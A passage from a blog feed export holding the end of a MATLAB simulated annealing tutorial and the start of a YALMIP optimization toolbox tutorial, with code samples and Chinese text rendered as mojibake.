class="built_in">i</span>+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    len=len+graph(city(n),city(<span class="number">1</span>));</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>æ¥ç€,æ ¹æ®æ—§è§£äº§ç”Ÿæ–°è§£çš„å‡½æ•°.æ–‡ä»¶<code>perturbTour.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">city</span>=<span class="title">perturbTour</span><span class="params">(city)</span></span></span><br><span class="line">    <span class="comment">%éšæœºç½®æ¢ä¸¤ä¸ªä¸åŒçš„åŸå¸‚çš„åæ ‡</span></span><br><span class="line">    <span class="comment">%äº§ç”Ÿéšæœºæ‰°åŠ¨</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    p1=randi([<span class="number">1</span>,n]);</span><br><span class="line">    p2=randi([<span class="number">1</span>,n]);</span><br><span class="line">    tmp=city(p1);</span><br><span class="line">    city(p1)=city(p2);</span><br><span class="line">    city(p2)=tmp;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>æœ€å,è°ƒç”¨æ¨¡æ‹Ÿé€€ç«å‡½æ•°(ä¸ç¬¬ä¸€æ­¥å†™åœ¨åŒä¸€æ–‡ä»¶),å¹¶è¿è¡Œ.æ–‡ä»¶<code>main.m</code></p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[city,res]=EzSA(city,@computerTour,@perturbTour)</span><br></pre></td></tr></table></figure></li></ul><p>ç»“æœ:<br>    <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">city =</span><br><span class="line">    <span class="number">4</span>     <span class="number">1</span>     <span class="number">3</span>     <span class="number">2</span>     <span class="number">5</span></span><br><span class="line">res =</span><br><span class="line">    <span class="number">20</span></span><br></pre></td></tr></table></figure></p><h1 id="åŸç†è®²è§£"><a href="#åŸç†è®²è§£" class="headerlink" title="åŸç†è®²è§£"></a>åŸç†è®²è§£</h1><p>æºä»£ç :<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[X resEnd]</span>=<span class="title">EzSA</span><span class="params">(X,ObjFun,ArriseNew,iter,zero)</span></span></span><br><span class="line">    [ra,co]=<span class="built_in">size</span>(X);</span><br><span class="line">    RES=[ObjFun(X)];  <span class="comment">%æ¯æ¬¡è¿­ä»£åçš„ç»“æœ</span></span><br><span class="line">    temperature=<span class="number">100</span>*co;      <span class="comment">%åˆå§‹æ¸©åº¦</span></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">3</span></span><br><span class="line">        zero=<span class="number">1e-2</span>;</span><br><span class="line">        iter=<span class="number">5e2</span>;               <span class="comment">%å†…éƒ¨è’™ç‰¹å¡æ´›å¾ªç¯è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">4</span></span><br><span class="line">        zero=<span class="number">1e-2</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    h=waitbar(<span class="number">0</span>,<span class="string">'SAing....'</span>);</span><br><span class="line">    <span class="keyword">while</span> temperature&gt;zero    <span class="comment">%åœæ­¢è¿­ä»£æ¸©åº¦</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:iter     <span class="comment">%å¤šæ¬¡è¿­ä»£æ‰°åŠ¨ï¼Œä¸€ç§è’™ç‰¹å¡æ´›æ–¹æ³•ï¼Œæ¸©åº¦é™ä½ä¹‹å‰å¤šæ¬¡å®éªŒ</span></span><br><span class="line">            preRes=ObjFun(X);         <span class="comment">%ç›®æ ‡å‡½æ•°è®¡ç®—ç»“æœ</span></span><br><span class="line">            tmpX=ArriseNew(X);      <span class="comment">%äº§ç”Ÿéšæœºæ‰°åŠ¨</span></span><br><span class="line">            newRes=ObjFun(tmpX);     <span class="comment">%è®¡ç®—æ–°ç»“æœ</span></span><br><span class="line"></span><br><span class="line">            delta_e=newRes-preRes;  <span class="comment">%æ–°è€ç»“æœçš„å·®å€¼ï¼Œç›¸å½“äºèƒ½é‡</span></span><br><span class="line">            <span class="keyword">if</span> delta_e&lt;<span class="number">0</span>        <span class="comment">%æ–°ç»“æœå¥½äºæ—§ç»“æœï¼Œç”¨æ–°è·¯çº¿ä»£æ›¿æ—§è·¯çº¿</span></span><br><span class="line">                X=tmpX;</span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">%æ¸©åº¦è¶Šä½ï¼Œè¶Šä¸å¤ªå¯èƒ½æ¥å—æ–°è§£ï¼›æ–°è€è·ç¦»å·®å€¼è¶Šå¤§ï¼Œè¶Šä¸å¤ªå¯èƒ½æ¥å—æ–°è§£</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">exp</span>(-delta_e/temperature)&gt;<span class="built_in">rand</span>() <span class="comment">%ä»¥æ¦‚ç‡é€‰æ‹©æ˜¯å¦æ¥å—æ–°è§£ p=exp(-Î”E/T)</span></span><br><span class="line">                    X=tmpX;      <span class="comment">%å¯èƒ½å¾—åˆ°è¾ƒå·®çš„è§£</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        RES=[RES ObjFun(X)];</span><br><span class="line">        temperature=temperature*<span class="number">0.99</span>;   <span class="comment">%æ¸©åº¦ä¸æ–­ä¸‹é™</span></span><br><span class="line">        waitbar((<span class="built_in">log</span>(temperature/(<span class="number">100</span>*co))/<span class="built_in">log</span>(<span class="number">0.99</span>))/(<span class="built_in">log</span>(zero/(<span class="number">100</span>*co))/<span class="built_in">log</span>(<span class="number">0.99</span>)),h,sprintf(<span class="string">'Now Temperature:%.2f'</span>,temperature));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    close(h)</span><br><span class="line">    <span class="built_in">plot</span>(RES);</span><br><span class="line">    resEnd=RES(<span class="keyword">end</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>ç»“åˆä»£ç å†çœ‹å¼€å¤´çš„æµç¨‹å›¾.</p><p>åˆå§‹åŒ–,è®¡ç®—åˆå§‹è§£çš„è§£å€¼,è®¾ç½®åˆå§‹æ¸©åº¦.<br>æ¨¡æ‹Ÿé€€ç«ç»“æ„ä¸Šå°±æ˜¯ä¸¤é‡å¾ªç¯,å¤–éƒ¨å¾ªç¯æ£€æŸ¥æ¸©åº¦å¹¶é™æ¸©,å†…éƒ¨ä¸æ–­åœ°äº§ç”Ÿæ–°è§£å¹¶ä¸æ—§è§£æ¯”è¾ƒ.</p><p>è‹¥æ–°è§£ä¼˜äºæ—§è§£åˆ™æ–°è§£æ— æ¡ä»¶è¢«æ—§è§£æ›¿ä»£.<br>å¦åˆ™,æœ‰ä¸€å®šæ¦‚ç‡(<code>exp(-Î”E/T)</code>)æ–°è§£å–ä»£æ—§è§£.<strong>æ³¨æ„è¿™ä¸ªç¯èŠ‚æ­£æ˜¯æ¨¡æ‹Ÿé€€ç«èƒ½è·³è„±å±€éƒ¨æœ€ä¼˜è§£,å–å¾—å…¨å±€æœ€ä¼˜è§£çš„å…³é”®</strong>.</p><p>ç”±æ­¤,æˆ‘ä»¬å¯ä»¥å¾—çŸ¥å½±å“æ¨¡æ‹Ÿé€€ç«æ•ˆæœçš„ä¸»è¦å› ç´ æœ‰:</p><ul><li>ç»ˆæ­¢æ¸©åº¦.ä¸€èˆ¬ä¸Š,ç»ˆæ­¢æ¸©åº¦è¶Šä½,å–å¾—è§£è¶Šä¼˜.</li><li>å†…éƒ¨è¿­ä»£æ¬¡æ•°.ä¸€èˆ¬ä¸Š,å†…éƒ¨è¿­ä»£æ¬¡æ•°è¶Šå¤š,å–å¾—è§£è¶Šä¼˜.</li><li>äº§ç”Ÿæ–°è§£å‡½æ•°.</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ¨¡æ‹Ÿé€€ç«æ˜¯å¯¹çƒ­åŠ›å­¦é€€ç«è¿‡ç¨‹çš„æ¨¡æ‹Ÿ,ä½¿ç®—æ³•åœ¨å¤šé¡¹å¼æ—¶é—´å†…èƒ½ç»™å‡ºä¸€ä¸ªè¿‘ä¼¼æœ€ä¼˜è§£.ç”±äºMATLABè‡ªå¸¦çš„æ¨¡æ‹Ÿé€€ç«å·¥å…·ç®±è°ƒç”¨å¤æ‚ä¸”æ‰§è¡Œæ•ˆæœä¸ç†æƒ³,æœ¬æ–‡ç»™å‡ºäº†è¾ƒç®€å•çš„å‡½æ•°åŸå‹å’Œè°ƒç”¨æ–¹æ³•.è¯¥ç®—æ³•ä¹ŸåŒ…å«ä»¥ä¸‹ä¼˜ç¼ºç‚¹(ä¸ªäººè§è§£):</p><p>ä¼˜ç‚¹:</p><ul><li>ç›¸è¾ƒäºä¸€èˆ¬çš„è’™ç‰¹å¡æ´›ç®—æ³•,æœ‰æ›´å°‘çš„å°è¯•æ¬¡æ•°,åŒæ—¶å®ç°ä¸Šå¹¶ä¸æ¯”è’™ç‰¹å¡æ´›èŠ±æ›´å¤šæ—¶é—´.</li><li>ç›¸è¾ƒäºé—ä¼ ç®—æ³•ç­‰å¤§å‹æ™ºèƒ½ç®—æ³•,æ¨¡æ‹Ÿé€€ç«å®ç°ç®€å•,å¹¶èƒ½è¿”å›è¾ƒæ»¡æ„çš„ç»“æœ.</li><li>ç›®æ ‡å‡½æ•°å¯ä»¥è‡ªå·±å®šåˆ¶,ç›¸è¾ƒäºæ™®é€šçš„è§„åˆ’è§£æå™¨,æ¨¡æ‹Ÿé€€ç«èƒ½é€‚ç”¨äºæ›´å¹¿çš„èŒƒå›´(NPCé—®é¢˜,ç”šè‡³ç»™ç»™ç¥ç»ç½‘ç»œåšä¼˜åŒ–).</li><li>å¯¹äºç¦»æ•£å‹çš„å˜é‡æœ‰æ›´ä¼˜ç§€çš„æ•ˆæœ.</li></ul><p>ç¼ºç‚¹:</p><ul><li>å†…éƒ¨æœ¬è´¨ä¸Šè¿˜æ˜¯è’™ç‰¹å¡æ´›ç®—æ³•,æ–°è§£ä¸æ—§è§£æœ¬è´¨ä¸Šæ— å…³è”.</li><li>ç›¸è¾ƒäºé—ä¼ ç®—æ³•,æ¨¡æ‹Ÿé€€ç«éš¾ä»¥æ§åˆ¶ç®—æ³•çš„è¿è¡Œæ—¶é—´,EzSAçš„åé¢ä¸¤ä¸ªå¯é€‰å‚æ•°å°±æ˜¯å†…éƒ¨è¿­ä»£æ¬¡æ•°å’Œ0åº¦æ¸©åº¦.è€Œè¿­ä»£æ¬¡æ•°ç»™å°‘äº†æ•ˆæœä¸ç†æƒ³,ç»™å¤šäº†æœ‰ä¼šå¢åŠ ç­‰å¾…æ—¶é—´.</li><li>å¯¹è¿ç»­å‹çš„è§„åˆ’é—®é¢˜æ•ˆæœå¹¶ä¸å¥½.</li></ul><p>æ ·ä¾‹å’Œå‡½æ•°åŸå‹ä¸‹è½½:<br><a href="https://github.com/Anemone95/matlab-sa" target="_blank" rel="noopener">https://github.com/Anemone95/matlab-sa</a></p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> äººå·¥æ™ºèƒ½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YALMIPå·¥å…·ç®±â€”â€”Matlabä¸Šè§£å†³è§„åˆ’é—®é¢˜çš„å¤§æ€å™¨</title>
      <link href="/%E6%95%B0%E6%A8%A1-YALMIP%E5%B7%A5%E5%85%B7%E7%AE%B1%E2%80%94%E2%80%94Matlab%E4%B8%8A%E8%A7%A3%E5%86%B3%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%A7%E6%9D%80%E5%99%A8/"/>
      <url>/%E6%95%B0%E6%A8%A1-YALMIP%E5%B7%A5%E5%85%B7%E7%AE%B1%E2%80%94%E2%80%94Matlab%E4%B8%8A%E8%A7%A3%E5%86%B3%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%A7%E6%9D%80%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>æ•°å­¦å»ºæ¨¡è¿‡å»å¾ˆå¤šå¹´äº†ï¼Œä½†æ˜¯YALMIPå·¥å…·ç®±çš„æ˜“ç”¨æ€§ä»ç„¶è®©æˆ‘å½±å“æ·±åˆ»ï¼Œç”¨è¿‡è¿™ä¸ªä¹‹åå†æƒ³æƒ³ç°åœ¨ç”¨çš„z3çº¦æŸæ±‚è§£çœŸçš„æ˜¯å¼±çˆ†äº†ï¼Œä»€ä¹ˆæ—¶å€™Pythonä¸Šé¢èƒ½æœ‰ä¸€ä¸ªé‚£ä¹ˆå¥½ç”¨çš„è§„åˆ’å·¥å…·å°±å¥½äº†&gt;_&lt;</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>è§„åˆ’é—®é¢˜å¯ä»¥ç®—æ˜¯æ•°æ¨¡ç«èµ›å¸¸è§çš„é—®é¢˜(ä½œä¸ºä¿¡å·¥é™¢çš„å°ç™½,å®åœ¨ä½©æœæ•°ç§‘é™¢çš„ç‰›äººä»¬èƒ½æŠŠä»»ä½•é—®é¢˜ææˆä¼˜åŒ–é—®é¢˜).ç”±äºMATLABè‡ªå¸¦çš„è§„åˆ’å·¥å…·ç®±å¹¶ä¸å¥½ç”¨,éƒ¨åˆ†åŒå­¦ä¸å¾—ä¸ç”¨Lingoç­‰è½¯ä»¶ä¸“é—¨è§£å†³è§„åˆ’é—®é¢˜,ä½†Lingoçš„è¯­æ³•å¯è¯»æ€§å¹¶æ²¡æœ‰matlabå¥½.YALMIPè§£å†³äº†è¿™ä¸ªé—®é¢˜.</p><a id="more"></a><p>ç®€å•æ¥è¯´,YALMIPæ˜¯ä¸€ä¸ªMATLABä¸Šçš„ä¸€ä¸ªå·¥å…·ç®±.å®ƒè®©ä½ ç”¨MATLABè¯­æ³•ä¼˜é›…åœ°è§£å†³å„ç§è§„åŒ–é—®é¢˜.(MATLABçš„å‡½æ•°éƒ½èƒ½ç”¨ï¼Œå¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒæˆ‘çš„å­¦ä¹ orz)</p><p>å¾€ç»†äº†è¯´,å®ƒå°†ä¼˜åŒ–é—®é¢˜è¿›è¡Œåˆ†ç±»,åœ¨åº•å±‚é€šè¿‡B/Sæ¨¡å¼è°ƒç”¨å¤–éƒ¨çš„å„ç§è§£æå™¨(æ¯ä¸€è§£æå™¨å¯ä»¥å¯¹åº”ä¸€ç±»æˆ–å¤šç±»é—®é¢˜,å¦‚Lingoçš„è§£æå™¨Lindoå°±åœ¨å…¶ä¸­),è€Œåœ¨å¤–éƒ¨,ä½ ä¸éœ€è¦äº†è§£å„ç§è§£æå™¨çš„å…·ä½“è¯­æ³•,åªéœ€æŒæ¡YALMIPçš„è¯­æ³•å°±å¯è½»æ¾çš„è°ƒç”¨ä»–ä»¬.ç”±æ­¤è§£å†³å¤§å¤šæ•°è§„åˆ’é—®é¢˜.<br><img src="/æ•°æ¨¡-YALMIPå·¥å…·ç®±â€”â€”Matlabä¸Šè§£å†³è§„åˆ’é—®é¢˜çš„å¤§æ€å™¨/yal.png" alt="yal"></p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ol><li><p>ç¡®ä¿MATLABç‰ˆæœ¬åœ¨2015aåŠä»¥ä¸Š.</p></li><li><p><a href="http://www.control.isy.liu.se/~johanl/YALMIP.zip" target="_blank" rel="noopener">ç‚¹å‡»æ­¤å¤„</a>ä¸‹è½½zipå®‰è£…åŒ…,éšåè§£å‹åˆ°MATLABç›®å½•ä¸‹,å¦‚æœä½ çš„MATLABå®‰è£…åœ¨é»˜è®¤ç›®å½•ä¸‹,é‚£ä¹ˆç»“æœå¦‚ä¸‹:</p></li></ol><p><img src="/æ•°æ¨¡-YALMIPå·¥å…·ç®±â€”â€”Matlabä¸Šè§£å†³è§„åˆ’é—®é¢˜çš„å¤§æ€å™¨/path.png" alt="path"></p><ol><li>å°†YALMIPçš„ç›®å½•åŠ å…¥åˆ°MATLABçš„PATHä¸­,å…¶ä¸­åŒ…æ‹¬:</li></ol><p><img src="/æ•°æ¨¡-YALMIPå·¥å…·ç®±â€”â€”Matlabä¸Šè§£å†³è§„åˆ’é—®é¢˜çš„å¤§æ€å™¨/addPath.jpg" alt="addPath"></p><ol><li><p>éªŒè¯YALMIPçš„å®‰è£…å·¥ä½œ</p><p> åœ¨MATLABä¸­è¾“å…¥<code>yalmiptest</code>,è‹¥å‡ºç°</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">|       Searching <span class="keyword">for</span> installed solvers       |</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">|        Solver|   Version/module|      Status|</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">|       LINPROG|                 |       found|</span><br><span class="line">|      QUADPROG|                 |       found|</span><br><span class="line">|        LMILAB|                 |       found|</span><br><span class="line">|       FMINCON|        geometric|       found|</span><br><span class="line">|                .......                      |</span><br><span class="line">|         FRLIB|                 |   not found|</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure><p> é‚£ä¹ˆæ­å–œä½ ,YALMIPå®‰è£…æˆåŠŸ!</p></li><li><p>å®‰è£…åŸºç¡€çš„è§£æå™¨<br> ç»†å¿ƒçš„æœ‹å‹åº”è¯¥å‘ç°äº†,å½“æˆ‘ä»¬æ‰§è¡Œ<code>yalmiptest</code>æ—¶,å®é™…ä¸Šæ˜¯æ£€æŸ¥å¯ä½¿ç”¨çš„è§£æå™¨.ä¸‹é¢å°±ä»‹ç»ä¸€äº›å¸¸ç”¨çš„è§£æå™¨ä»¥åŠå®‰è£…</p><p> Gurobi/CPLEX:Gurobiå’ŒCPLEXé€‚ç”¨çš„èŒƒå›´å·®ä¸å¤š,æ‰€ä»¥ä¸Šåªè¦è£…ä¸€ä¸ªå°±è¡Œ.æ€§èƒ½çš„è¯è¿˜æ˜¯CPLEXä¼šå¥½ä¸€ç‚¹(æ¯•ç«ŸIBM,ä½†å·®åˆ«ä¸å¤§),ä¸¤è€…éƒ½æœ‰é’ˆå¯¹å­¦æœ¯çš„å…è´¹ç‰ˆæœ¬,CPLEXå­¦æœ¯ç‰ˆæœ¬çš„è·å–éœ€è¦ä»¥æ•™å¸ˆèº«ä»½æ³¨å†Œ,è€ŒGurobiæ˜¯éœ€è¦æ•™è‚²ç½‘IPéªŒè¯.åŒæ—¶Gurobiè¿˜æœ‰å…è´¹çš„ç¤¾åŒºç‰ˆæœ¬(åŠå¹´).å„ç‰ˆæœ¬çš„åŒºåˆ«éƒ½åœ¨äºæ”¯æŒçš„å˜é‡æ•°ä¸Š,ç„¶è€ŒGurobiçš„ç¤¾åŒºç‰ˆæœ¬ä¸ªäººä»¥ä¸ºå®Œå…¨å¯ä»¥æ»¡è¶³å›½èµ›çš„éœ€è¦äº†(è¶…äº†é‚£ä¸ªæ•°é‡è‡ªå·±æƒ³æƒ³æ€è·¯æœ‰æ²¡æœ‰é—®é¢˜).</p><p> ä»¥ä¸‹æ˜¯Gurobiçš„å®‰è£…æµç¨‹.</p><ol><li>å…ˆåˆ°<a href="http://www.gurobi.com/" target="_blank" rel="noopener">Gurobi</a>å®˜ç½‘ä¸Šæ³¨å†Œè´¦å·.</li><li>ç”³è¯·å¯¹åº”ç‰ˆæœ¬çš„åºåˆ—å·.</li><li>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬<a href="http://user.gurobi.com/download/gurobi-optimizer" target="_blank" rel="noopener">Gurobi</a>,å®‰è£…åé‡å¯.</li><li>Win+Rè¿è¡Œcmdå›è½¦å è¾“å…¥æ¿€æ´»ç <code>grbgetkey xxx-xxx-xxx-xxx</code>.</li><li>åœ¨MATLABä¸‹è¿è¡ŒGurobi/win/matlab/gurobi_setup.m åŒæ—¶ä¿å­˜PATH<code>savepath</code></li><li><p>åœ¨è¿è¡Œ<code>yalmiptest</code>åº”è¯¥çœ‹åˆ°Gurobiå˜æˆfoundäº†.</p><p>å½“ç„¶,å¦‚æœä½ ç¡®å®éœ€è¦ä¸€ä¸ªæ”¯æŒå¤§é‡å˜é‡çš„è§£æå™¨,é‚£ä¹ˆä½ åªèƒ½ç”¨mosekäº†,åªéœ€è¦edué‚®ç®±éªŒè¯,ç„¶è€Œè§£é¢˜é€Ÿåº¦ä¼šæ…¢å¾ˆå¤š.</p></li></ol></li></ol><h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><ol><li><p>è®¾æœªçŸ¥é‡</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = sdpvar(n,m); <span class="comment">%ç”Ÿæˆaè¡Œbåˆ—çš„æœªçŸ¥é‡</span></span><br></pre></td></tr></table></figure><p> ä¹‹å‰ä¹Ÿè¯´è¿‡YALMIPçš„æœªçŸ¥é‡æœ‰3ä¸­ç±»å‹.åˆ†åˆ«ä¸º</p><ul><li>sdpvar %å®å‹</li><li>intvar %æ•´å‹</li><li>binvar %0-1å‹<br>éœ€è¦æ··åˆè§„åˆ’å¤šè®¾å‡ ä¸ªå˜é‡å°±è¡Œäº†</li></ul></li><li><p>çº¦æŸæ¡ä»¶, ä¾‹å¦‚:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F = [<span class="number">-2</span> &lt;= x &lt;= <span class="number">2</span>];</span><br></pre></td></tr></table></figure></li><li><p>å†™ç›®æ ‡å‡½æ•°</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj = x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br></pre></td></tr></table></figure></li><li><p>æ±‚è§£</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize(F,obj[,options]);</span><br></pre></td></tr></table></figure><p> Fä¸ºçº¦æŸ,objä¸ºç›®æ ‡å‡½æ•°(é»˜è®¤æ±‚æœ€å°å€¼),optionså¯é€‰æ‹©æ±‚è§£å™¨,æ”¹å˜è¾“å‡ºæ–¹å¼,å¦‚:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize(F,obj,sdpsettings(<span class="string">'solver'</span>,<span class="string">'gurobi'</span>,<span class="string">'verbose'</span>,<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p> æŒ‡å®šsolverä¸ºGurobi,ä¸æ‰“å°è§£æè¿‡ç¨‹.</p></li><li>è·å–ç»“æœ <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt=value(x); <span class="comment">%xçš„å€¼</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="å…·ä½“æ¡ˆä¾‹"><a href="#å…·ä½“æ¡ˆä¾‹" class="headerlink" title="å…·ä½“æ¡ˆä¾‹"></a>å…·ä½“æ¡ˆä¾‹</h1><h2 id="æ¡ˆä¾‹ä¸€-æ±‚-x-2-y-2åœ¨x-yâˆˆ-2-2-ä¸Šçš„æœ€å°å€¼"><a href="#æ¡ˆä¾‹ä¸€-æ±‚-x-2-y-2åœ¨x-yâˆˆ-2-2-ä¸Šçš„æœ€å°å€¼" class="headerlink" title="æ¡ˆä¾‹ä¸€:æ±‚ x^2+y^2åœ¨x,yâˆˆ[-2,2]ä¸Šçš„æœ€å°å€¼"></a>æ¡ˆä¾‹ä¸€:æ±‚ x^2+y^2åœ¨x,yâˆˆ[-2,2]ä¸Šçš„æœ€å°å€¼</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%ç”Ÿæˆ2*1çš„çŸ©é˜µå˜é‡</span></span><br><span class="line">x = sdpvar(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">%é™åˆ¶æ¡ä»¶</span></span><br><span class="line">F = [<span class="number">-2</span> &lt;= x &lt;= <span class="number">2</span>];</span><br><span class="line"><span class="comment">%ç›®æ ‡å‡½æ•°</span></span><br><span class="line">obj = x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line"><span class="comment">%æ±‚è§£</span></span><br><span class="line">optimize(F,obj);</span><br><span class="line"><span class="comment">%å–å¾—å€¼ä»¥åŠå¯¹åº”çš„xçš„å€¼</span></span><br><span class="line">optobj = value(obj)</span><br><span class="line">optx = value(x)</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹(æˆ‘çš„gurobiè¿‡æœŸäº†,ä»¥ä¸‹ä¸ºMATLABè‡ªå¸¦æ±‚è§£å™¨ç»“æœ)<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">optobj =</span><br><span class="line">   <span class="number">1.5449e-43</span></span><br><span class="line">optx =</span><br><span class="line">   <span class="number">1.0e-21</span> *</span><br><span class="line">    <span class="number">0.2779</span>    <span class="number">0.2779</span></span><br></pre></td></tr></table></figure></p><h2 id="æ¡ˆä¾‹äºŒ-æŒ‡æ´¾é—®é¢˜-A-B-Cä¸º3ä¸ªå‘˜å·¥-P-Q-Rä¸º3æ ·å·¥ä½œ-æˆæœ¬è¡¨å¦‚ä¸‹"><a href="#æ¡ˆä¾‹äºŒ-æŒ‡æ´¾é—®é¢˜-A-B-Cä¸º3ä¸ªå‘˜å·¥-P-Q-Rä¸º3æ ·å·¥ä½œ-æˆæœ¬è¡¨å¦‚ä¸‹" class="headerlink" title="æ¡ˆä¾‹äºŒ:æŒ‡æ´¾é—®é¢˜,A,B,Cä¸º3ä¸ªå‘˜å·¥,P,Q,Rä¸º3æ ·å·¥ä½œ,æˆæœ¬è¡¨å¦‚ä¸‹:"></a>æ¡ˆä¾‹äºŒ:æŒ‡æ´¾é—®é¢˜,A,B,Cä¸º3ä¸ªå‘˜å·¥,P,Q,Rä¸º3æ ·å·¥ä½œ,æˆæœ¬è¡¨å¦‚ä¸‹:</h2><div class="table-container"><table><thead><tr><th></th><th>A</th><th>B</th><th>C</th></tr></thead><tbody><tr><td>P</td><td>9</td><td>6</td><td>2</td></tr><tr><td>Q</td><td>3</td><td>1</td><td>4</td></tr><tr><td>R</td><td>5</td><td>6</td><td>10</td></tr></tbody></table></div><p>ä»£ç :<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%è®¾x(a,b)==1ä¸ºaåšbå·¥ä½œ</span></span><br><span class="line">x=binvar(<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line"><span 